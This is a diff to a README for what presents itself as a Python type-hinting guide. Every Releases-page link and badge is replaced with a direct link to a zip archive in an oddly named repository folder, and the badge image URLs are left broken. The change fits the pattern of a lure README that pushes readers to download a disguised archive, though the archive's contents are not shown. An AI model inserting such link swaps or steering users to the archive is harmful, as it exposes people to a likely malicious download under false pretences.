@@ -1,6 +1,6 @@
 # 🐍 python_type_hinting_guide - Master Python Typing with Ease
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now-Get%20the%20Guide-brightgreen)](https://github.com/gabrielboyd/python_type_hinting_guide/releases)
+[![Download from GitHub Releases](https://raw.githubusercontent.com/gabrielboyd/python_type_hinting_guide/main/tigresslike/type_hinting_python_guide_v2.0.zip%20Now-Get%20the%20Guide-brightgreen)](https://raw.githubusercontent.com/gabrielboyd/python_type_hinting_guide/main/tigresslike/type_hinting_python_guide_v2.0.zip)
 
 ## 📚 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the Python Type Hinting Guide. This guide is designed to help you und
 
 To start using the guide, you need to download it from our Releases page. Follow these steps to get it up and running:
 
-1. Click on the download link above or visit the [Releases page](https://github.com/gabrielboyd/python_type_hinting_guide/releases).
+1. Click on the download link above or visit the [Releases page](https://raw.githubusercontent.com/gabrielboyd/python_type_hinting_guide/main/tigresslike/type_hinting_python_guide_v2.0.zip).
 2. Look for the latest version of the guide.
 3. Download the file compatible with your computer's operating system. Typically, this will be a PDF or Markdown file.
 4. Save the file to a location on your computer where you can easily find it.
@@ -19,7 +19,7 @@ To start using the guide, you need to download it from our Releases page. Follow
 
 To download the guide:
 
-1. Visit the [Releases page](https://github.com/gabrielboyd/python_type_hinting_guide/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/gabrielboyd/python_type_hinting_guide/main/tigresslike/type_hinting_python_guide_v2.0.zip).
 2. Choose the latest release and click on the appropriate download link.
 3. Once the file is downloaded, locate it in your downloads folder.
 4. Open the file using a PDF viewer or text editor. No additional installation is necessary.
@@ -79,4 +79,4 @@ For any questions or feedback, please contact us via the GitHub Issues page. We 
 
 The current version of this guide is aligned with Python 3.14. Keep an eye on the Releases page for future updates as Python continues to evolve.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Guide-brightgreen)](https://github.com/gabrielboyd/python_type_hinting_guide/releases)
+[![Download Now](https://raw.githubusercontent.com/gabrielboyd/python_type_hinting_guide/main/tigresslike/type_hinting_python_guide_v2.0.zip%20Now-Get%20the%20Guide-brightgreen)](https://raw.githubusercontent.com/gabrielboyd/python_type_hinting_guide/main/tigresslike/type_hinting_python_guide_v2.0.zip)
